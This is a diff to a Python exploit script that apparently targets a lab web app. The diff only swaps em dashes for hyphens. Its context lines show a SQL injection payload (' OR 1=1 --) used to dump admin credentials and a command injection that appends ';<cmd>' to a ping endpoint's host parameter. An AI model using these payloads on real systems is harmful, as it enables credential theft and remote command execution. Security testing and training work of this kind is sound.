@@ -47,7 +47,7 @@ def main() -> int:
 
     # Step 1: If no password provided, dump admin password via SQLi
     if not password:
-        print("[*] No password provided — dumping admin credentials via SQLi...")
+        print("[*] No password provided - dumping admin credentials via SQLi...")
         sqli_params = urllib.parse.urlencode({"name": "' OR 1=1 --"})
         sqli_url = f"{base}/api/users?{sqli_params}"
         req = urllib.request.Request(sqli_url, headers={"Accept": "application/json"})
@@ -92,7 +92,7 @@ def main() -> int:
         return 1
 
     # Step 3: Command injection via ping
-    # payload: ;<cmd>  — the shell runs: echo MEMO-PING ;<cmd>
+    # payload: ;<cmd>  - the shell runs: echo MEMO-PING ;<cmd>
     payload = f";{args.cmd}"
     ping_params = urllib.parse.urlencode({"host": payload})
     ping_url = f"{base}/api/tools/ping?{ping_params}"
